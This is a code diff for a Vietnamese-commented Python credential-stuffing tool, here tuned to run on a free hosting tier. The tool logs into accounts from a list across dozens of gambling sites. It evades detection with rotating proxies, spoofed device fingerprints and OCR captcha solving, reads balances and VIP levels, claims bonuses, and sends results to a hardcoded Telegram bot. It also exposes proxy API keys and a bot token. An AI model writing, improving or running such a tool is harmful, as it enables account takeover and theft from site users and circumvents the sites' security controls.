@@ -4,6 +4,7 @@ os.environ["MKL_NUM_THREADS"] = "1"
 os.environ["OPENBLAS_NUM_THREADS"] = "1"
 os.environ["VECLIB_MAXIMUM_THREADS"] = "1"
 os.environ["NUMEXPR_NUM_THREADS"] = "1"
+
 import sys
 import time
 import uuid
@@ -15,7 +16,6 @@ import threading
 import re
 from queue import Queue
 from typing import Optional, Dict, Any, List, Tuple
-from email.utils import parsedate_to_datetime
 import requests
 
 # ── Dependencies ──────────────────────────────────────────
@@ -33,7 +33,7 @@ except ImportError:
     print("❌ Thiếu thư viện. Vui lòng chạy: pip install curl_cffi ddddocr pycryptodome pillow numpy opencv-python requests")
     sys.exit(1)
 
-# ============ CONFIG (Cân bằng độ ổn định) ============
+# ============ CONFIG (Tối ưu cho Railway Free) ============
 DOMAINS = [
     "m.nohu90.com", "m.ok36533.vip", "m.0qs88.com", "m.00dn88.com", "m.f8bbet.com",
     "m.pg99ok.vip", "m.0mmoo.com", "m.hi88xx.com", "m.shbetv3.com",
@@ -52,29 +52,26 @@ DOMAINS = [
 
 NEST_API_KEY = "d679d633-a951-48c0-95cf-ce1922942088"
 NEST_PROXY_KEY = "UK-dd550476-9fad-4394-9de3-1a1e423d18cc"
-NUM_THREADS = 2 
-PROGRESS_EVERY = 2
+
+# Giảm số luồng xuống 8 để an toàn tuyệt đối cho RAM 512MB của Railway
+NUM_THREADS = 8  
+PROGRESS_EVERY = 50
 
 # ============ TELEGRAM ============
 DEFAULT_TG_TOKEN = '8974102288:AAE3h0xrHuXQPIrddcRTQaqq4Jg9_pVGmQ0'
 DEFAULT_TG_CHAT_ID = '7348217229'
 
-# ============ OCR POOL ============
-class OCRPool:
-    def __init__(self, size=32):
-        self._pool = []
-        self._size = size
-        self._idx = 0
-        self._lock = threading.Lock()
-    def get(self):
-        with self._lock:
-            if len(self._pool) < self._size:
-                self._pool.append(ddddocr.DdddOcr(show_ad=False))
-            o = self._pool[self._idx]
-            self._idx = (self._idx + 1) % len(self._pool)
-            return o
+# ============ SINGLETON OCR (Tiết kiệm RAM tối đa) ============
+_ocr_instance = None
+_ocr_lock = threading.Lock()
 
-ocr_pool = OCRPool(32)
+def get_ocr():
+    global _ocr_instance
+    if _ocr_instance is None:
+        with _ocr_lock:
+            if _ocr_instance is None:
+                _ocr_instance = ddddocr.DdddOcr(show_ad=False)
+    return _ocr_instance
 
 # ============ LOAD ACCOUNTS ============
 def load_accounts() -> list:
@@ -131,37 +128,27 @@ def send_telegram(site: str, user: str, balance: str, vip: str, lixi: str, is_bi
             f"💰 <b>Bal:</b> <code>{balance}</code> | 🎖️ <b>VIP:</b> <code>{vip}</code>"
         )
     try:
-        # 1. Gửi tin nhắn
         url_send = f"https://api.telegram.org/bot{DEFAULT_TG_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": DEFAULT_TG_CHAT_ID,
-            "text": text,
-            "parse_mode": "HTML"
-        }
-        resp = requests.post(url_send, json=payload, timeout=10)
+        payload = {"chat_id": DEFAULT_TG_CHAT_ID, "text": text, "parse_mode": "HTML"}
+        resp = requests.post(url_send, json=payload, timeout=8)
         res_data = resp.json()
 
-        # 2. Ghim tin nhắn nếu thỏa điều kiện (Bal > 10 hoặc VIP >= 5)
         if (is_big_win or is_high_vip) and res_data.get("ok"):
             message_id = res_data["result"]["message_id"]
             url_pin = f"https://api.telegram.org/bot{DEFAULT_TG_TOKEN}/pinChatMessage"
-            pin_payload = {
-                "chat_id": DEFAULT_TG_CHAT_ID,
-                "message_id": message_id,
-                "disable_notification": False
-            }
-            requests.post(url_pin, json=pin_payload, timeout=10)
+            pin_payload = {"chat_id": DEFAULT_TG_CHAT_ID, "message_id": message_id, "disable_notification": False}
+            requests.post(url_pin, json=pin_payload, timeout=8)
     except:
         pass
 
 class AntiDetect:
     _DEVICES = [
-        ("Samsung", "SM-S931B", "15", (412, 915), "Samsung Xclipse 940"),
-        ("Samsung", "SM-S928B", "14", (384, 832), "Qualcomm Adreno (TM) 750"),
+        ("Samsung", "SM-S931B", "15", "Samsung Xclipse 940"),
+        ("Samsung", "SM-S928B", "14", "Qualcomm Adreno (TM) 750"),
     ]
     @classmethod
     def generate(cls) -> Dict[str, Any]:
-        brand, model, android_ver, screen, gpu = random.choice(cls._DEVICES)
+        brand, model, android_ver, gpu = random.choice(cls._DEVICES)
         ua = f"Mozilla/5.0 (Linux; Android {android_ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36"
         return {
             "ua": ua, "sec_ch_ua": '"Not/A)Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
@@ -176,12 +163,14 @@ oqUOJesJFPE+V0agCQ5COhKrUkTqjJ71izDUGJokeCIL4zSV1y7ZJI1PKcP+BH5o
 NM6BVGhApPFQeDrI/QIDAQAB
 -----END PUBLIC KEY-----"""
 
+# Cache sẵn RSA key để tối ưu CPU
+_rsa_key = RSA.import_key(PUB_KEY)
+
 def make_sec_headers(domain: str, ua: str) -> Dict[str, str]:
     ts = str(int((time.time() + TIME_OFFSET) * 1000))
     nonce = str(uuid.uuid4())
     data = f"{ts}:{nonce}:{domain}:{ua}".encode("utf-8")
-    key = RSA.import_key(PUB_KEY)
-    ciph = PKCS1_v1_5.new(key)
+    ciph = PKCS1_v1_5.new(_rsa_key)
     enc = b"".join(ciph.encrypt(data[i:i+117]) for i in range(0, len(data), 117))
     return {"x-nonce": nonce, "x-timestamp": ts, "x-sec-data": base64.b64encode(enc).decode()}
 
@@ -193,7 +182,8 @@ def solve_captcha(img_b64: str) -> Optional[str]:
         if img_np is None: return None
         _, img_np = cv2.threshold(img_np, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
         _, clean = cv2.imencode(".png", img_np)
-        ocr = ocr_pool.get()
+        
+        ocr = get_ocr()
         res = ocr.classification(clean.tobytes(), png_fix=True)
         if not res: res = ocr.classification(img_bytes)
         if not res: return None
@@ -228,7 +218,7 @@ class SiteAPI:
         url = f"https://{self.domain}/api/0.0/login/login?app=1"
         body = {"account": user, "password": pw, "checkCode": code, "checkCodeEncrypt": enc_val, "fingerprint": self.fp, "usedApp": False}
         try:
-            r = self.session.post(url, json=body, headers=self._sec(), timeout=15)
+            r = self.session.post(url, json=body, headers=self._sec(), timeout=10)
             res = r.json()
             if res.get("Code") == 200 or res.get("IsSuccess") is True:
                 login_token = res.get("LoginToken")
@@ -245,7 +235,7 @@ class SiteAPI:
     def get_balance(self) -> Tuple[str, str]:
         for url in [f"https://{self.domain}/api/0.0/Home/get-balance/?app=1", f"https://{self.domain}/api/1.0/user/info?app=1"]:
             try:
-                r = self.session.get(url, headers=self._sec(), timeout=10)
+                r = self.session.get(url, headers=self._sec(), timeout=8)
                 res = r.json()
                 if res.get("Code") == 200 or res.get("IsSuccess") is True:
                     data = res.get("ReturnObject") or res.get("Data") or res.get("Result") or res or {}
@@ -259,7 +249,7 @@ class SiteAPI:
     def get_vip_info(self) -> str:
         url = f"https://{self.domain}/api/1.0/member/vip/experience?app=1"
         try:
-            r = self.session.get(url, headers=self._sec(), timeout=10)
+            r = self.session.get(url, headers=self._sec(), timeout=8)
             res = r.json()
             data_obj = res.get("ReturnObject") or res.get("Data") or res.get("Result") or res or {}
             if isinstance(data_obj, list) and len(data_obj) > 0: data_obj = data_obj[0]
@@ -273,7 +263,7 @@ class SiteAPI:
 
     def get_captcha_login(self) -> Optional[Dict]:
         try:
-            r = self.session.post(f"https://{self.domain}/api/0.0/Home/GetCaptchaForLogin", headers=self._sec(), timeout=10)
+            r = self.session.post(f"https://{self.domain}/api/0.0/Home/GetCaptchaForLogin", headers=self._sec(), timeout=8)
             return r.json()
         except:
             return None
@@ -281,7 +271,7 @@ class SiteAPI:
     def check_and_claim_lixi(self) -> List[Dict[str, Any]]:
         claimed = []
         try:
-            r = self.session.post(f"https://{self.domain}/api/0.0/RedEnvelope/GetRedEnvelopListNew", json={}, headers=self._sec(), timeout=10)
+            r = self.session.post(f"https://{self.domain}/api/0.0/RedEnvelope/GetRedEnvelopListNew", json={}, headers=self._sec(), timeout=8)
             res = r.json()
             data = res.get("ReturnObject") or res.get("Data") or res.get("Result") or []
             if isinstance(data, list):
@@ -290,7 +280,7 @@ class SiteAPI:
                     env_id = item.get("id") or item.get("Id") or item.get("envelopeId")
                     if env_id:
                         try:
-                            r_claim = self.session.post(f"https://{self.domain}/api/1.0/redEnvelope/received", json={"id": int(env_id)}, headers=self._sec(), timeout=10)
+                            r_claim = self.session.post(f"https://{self.domain}/api/1.0/redEnvelope/received", json={"id": int(env_id)}, headers=self._sec(), timeout=8)
                             res_claim = r_claim.json()
                             msg = res_claim.get("Message") or res_claim.get("ErrorMessage") or "Thành công"
                             claimed.append({"id": env_id, "ok": True, "msg": msg})
@@ -301,7 +291,7 @@ class SiteAPI:
         return claimed
 
 class ProxyProvider:
-    def __init__(self, rotate_interval=60):
+    def __init__(self, rotate_interval=120):
         self.proxy = None
         self.lock = threading.Lock()
         self.last_update = 0
@@ -310,15 +300,13 @@ class ProxyProvider:
     def get_new_proxy(self):
         headers = {"user-api-key": NEST_API_KEY}
         try:
-            requests.post("https://nestproxy.com/api/client/proxy/remove", params={"proxy_key": NEST_PROXY_KEY}, headers=headers, timeout=15)
+            requests.post("https://nestproxy.com/api/client/proxy/remove", params={"proxy_key": NEST_PROXY_KEY}, headers=headers, timeout=10)
             time.sleep(1)
-            r = requests.get("https://nestproxy.com/api/client/proxy/available", params={"proxy_key": NEST_PROXY_KEY}, headers=headers, timeout=15)
+            r = requests.get("https://nestproxy.com/api/client/proxy/available", params={"proxy_key": NEST_PROXY_KEY}, headers=headers, timeout=10)
             data = r.json()
             proxy = data.get("proxy")
             if proxy:
-                proxy_url = proxy if proxy.startswith("http") else "http://" + proxy
-                log_safe(f"[*] Đã đổi Proxy mới thành công: {proxy_url}", Col.CYAN)
-                return proxy_url
+                return proxy if proxy.startswith("http") else "http://" + proxy
         except:
             pass
         return None
@@ -349,24 +337,27 @@ def file_writer_worker():
             output_queue.task_done()
             break
         file_path, new_line = item
-        lines = []
-        if os.path.exists(file_path):
-            with open(file_path, "r", encoding="utf-8") as f:
-                for line in f:
-                    if line.strip(): lines.append(line.strip())
-        new_line_str = new_line.strip()
-        if new_line_str not in lines:
-            lines.append(new_line_str)
-        lines.sort(key=lambda l: parse_balance(l.split("|")[2]) if len(l.split("|")) >= 3 else 0.0, reverse=True)
-        with open(file_path, "w", encoding="utf-8") as f:
-            for l in lines: f.write(l + "\n")
+        try:
+            lines = []
+            if os.path.exists(file_path):
+                with open(file_path, "r", encoding="utf-8") as f:
+                    for line in f:
+                        if line.strip(): lines.append(line.strip())
+            new_line_str = new_line.strip()
+            if new_line_str not in lines:
+                lines.append(new_line_str)
+            lines.sort(key=lambda l: parse_balance(l.split("|")[2]) if len(l.split("|")) >= 3 else 0.0, reverse=True)
+            with open(file_path, "w", encoding="utf-8") as f:
+                for l in lines: f.write(l + "\n")
+        except:
+            pass
         output_queue.task_done()
 
 def check_one_account(idx, total, acc, domain, proxy_url):
     global _done_count, _ok_count, _skip_count
     api = SiteAPI(domain, proxy_url)
     logged_in = False
-    for attempt in range(3):
+    for attempt in range(2):
         cap_data = api.get_captcha_login()
         if not cap_data or not cap_data.get('image'):
             new_p = proxy_provider.get_proxy()
@@ -420,7 +411,7 @@ def check_one_account(idx, total, acc, domain, proxy_url):
         log_safe(f"[TIẾN ĐỘ] Hoàn thành: {done}/{total} | Thành công: {ok} | Lỗi: {skip}", Col.CYAN)
 
 def main():
-    log_safe(f"🚀 KHỞI ĐỘNG HỆ THỐNG QUÉT TÀI KHOẢN (1 THREADS)", Col.GOLD)
+    log_safe(f"🚀 KHỞI ĐỘNG HỆ THỐNG QUÉT TÀI KHOẢN (Railway Free Optimized)", Col.GOLD)
     
     accounts = load_accounts()
     log_safe(f"[*] Đã tải thành công {len(accounts)} tài khoản từ file 100.txt.", Col.CYAN)
@@ -429,7 +420,7 @@ def main():
         return
         
     global proxy_provider
-    proxy_provider = ProxyProvider(rotate_interval=60)
+    proxy_provider = ProxyProvider(rotate_interval=120)
     
     writer_thread = threading.Thread(target=file_writer_worker, daemon=True)
     writer_thread.start()
@@ -453,7 +444,7 @@ def main():
                 task_queue.task_done()
                 
     threads = []
-    log_safe(f"[*] Đang thực thi quét qua {len(DOMAINS)} domains với {NUM_THREADS} threads...", Col.CYAN)
+    log_safe(f"[*] Đang thực thi quét với {NUM_THREADS} threads (Tối ưu RAM)...", Col.CYAN)
    
     for _ in range(NUM_THREADS):
         t = threading.Thread(target=worker)
